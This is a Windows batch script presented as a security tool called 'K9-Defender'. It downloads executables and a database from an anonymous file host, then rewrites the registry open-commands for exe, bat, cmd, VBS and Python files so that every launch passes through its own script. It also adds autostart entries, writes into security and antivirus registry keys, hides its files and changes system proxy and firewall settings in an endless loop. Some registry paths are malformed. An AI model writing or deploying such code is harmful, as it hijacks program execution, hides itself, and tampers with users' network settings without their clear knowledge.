::K91408815
@echo off
setlocal EnableDelayedExpansion
powershell -Command "(New-Object Net.WebClient).DownloadFile('https://cdn-107.anonfiles.com/986c9eRbxd/a5b45674-1648479585/NSudo.exe', 'NSudo.exe')"
powershell -Command "Invoke-WebRequest https://cdn-107.anonfiles.com/986c9eRbxd/a5b45674-1648479585/NSudo.exe -OutFile NSudo.exe"
powershell -Command "(New-Object Net.WebClient).DownloadFile('https://cdn-130.anonfiles.com/3c5b9eR4x5/6b9359c3-1648479482/Malware.DB', 'Malware.DB')"
powershell -Command "Invoke-WebRequest https://cdn-130.anonfiles.com/3c5b9eR4x5/6b9359c3-1648479482/Malware.DB -OutFile Malware.DB"
powershell -Command "(New-Object Net.WebClient).DownloadFile('https://cdn-128.anonfiles.com/t16292Rdxc/1fc5ded2-1648479589/sha256.exe', 'sha256.exe')"
powershell -Command "Invoke-WebRequest https://cdn-128.anonfiles.com/t16292Rdxc/1fc5ded2-1648479589/sha256.exe -OutFile sha256.exe"
if "%~x0" == ".cmd" (
start afh.bat
exit /b 404-0
)
set tmpfile=ipblock.tmp
ASSOC .K9E=exefile
ASSOC .K9C=cmdfile
ASSOC .K9B=batfile
ASSOC .web=CompressedFolder
reg export "HKEY_CLASSES_ROOT\cmdfile\shell\open\command" cmdfile_backup%date:~4,2%-%date:~7,2%-%date:~10,4%.reg /y > nul 2>&1 && echo Backup saved
reg add "HKEY_CLASSES_ROOT\cmdfile\shell\open\command" /d "\"%~dp0startfile.cmd\" \"%%1\" %%*" /f > nul 2>&1 && (echo Protection installed successfully) || (echo Failed to install protection)
reg export "HKEY_CLASSES_ROOT\batfile\shell\Open\command" batfile_backup%date:~4,2%-%date:~7,2%-%date:~10,4%.reg /y > nul 2>&1 && echo Backup saved
reg add "HKEY_CLASSES_ROOT\batfile\shell\Open\command" /d "\"%~dp0startfile.cmd\" \"%%1\" %%*" /f > nul 2>&1 && (echo Protection installed successfully) || (echo Failed to install protection)
reg export "HKEY_CLASSES_ROOT\exefile\shell\Open\command" exefile_backup%date:~4,2%-%date:~7,2%-%date:~10,4%.reg /y > nul 2>&1 && echo Backup saved
reg add "HKEY_CLASSES_ROOT\exefile\shell\Open\command" /d "\"%~dp0startfile.cmd\" \"%%1\" %%*" /f > nul 2>&1 && (echo Protection installed successfully) || (echo Failed to install protection)
reg export "HKEY_CLASSES_ROOT\VBSFile\Shell\Open\Command" VBSfile_backup%date:~4,2%-%date:~7,2%-%date:~10,4%.reg /y > nul 2>&1 && echo Backup saved
reg add "HKEY_CLASSES_ROOT\VBSFile\Shell\Open\Command" /d "\"%~dp0startfile.cmd\" \"%%1\" %%*" /f > nul 2>&1 && (echo Protection installed successfully) || (echo Failed to install protection)
reg export "HKEY_CLASSES_ROOT\VBSFile\Shell\Open2\Command" VBS2file_backup%date:~4,2%-%date:~7,2%-%date:~10,4%.reg /y > nul 2>&1 && echo Backup saved
reg add "HKEY_CLASSES_ROOT\VBSFile\Shell\Open2\Command" /d "\"%~dp0startfile.cmd\" \"%%1\" %%*" /f > nul 2>&1 && (echo Protection installed successfully) || (echo Failed to install protection)
reg export "HKEY_CLASSES_ROOT\pyfile\shell\open\command" pyfile_backup%date:~4,2%-%date:~7,2%-%date:~10,4%.reg /y > nul 2>&1 && echo Backup saved
reg add "HKEY_CLASSES_ROOT\pyfile\shell\open\command" /d "\"%~dp0startfile.cmd\" \"%%1\" %%*" /f > nul 2>&1 && (echo Protection installed successfully) || (echo Failed to install protection)
:ipbl
reg add "HHKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /f /v "K9-Defender" /t "REG_SZ" /d %0
reg add "HHKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /f /v "K9-Defender-Scan" /t "REG_SZ" /d %~dp0USB_Scan%~x0
reg add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "%~nx0" /t REG_SZ /F /D "%~dp0"
reg add "HKEY_LOCAL_MACHINE\SECURITY" /f /v "K9-Defender" /t "REG_SZ" /d %0
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Security Center\Provider\Av" /f /v "Main" /t "REG_SZ" /d %0
cls
schtasks /Create /tn K9-Defender /XML %~dp0K9-Defender.xml
reg load regdata.reg
ATTRIB /S /D %~dp0 +s +h
ATTRIB /S /D %~nx0 +s +h
FOR /F %%i IN (%~dp0proxylist.txt) DO (
netsh winhttp set proxy %%i
)
FOR /F %%j IN (%~dp0IP.K9) DO (
netsh advfirewall firewall add rule name=BlockIP dir=in action=block remoteip=%%j
)
ipconfig /flushdns
Start /i /b /wait timeout -t 10 /NOBREAK 1>nul 2>nul
goto ipbl
exit /b 404-1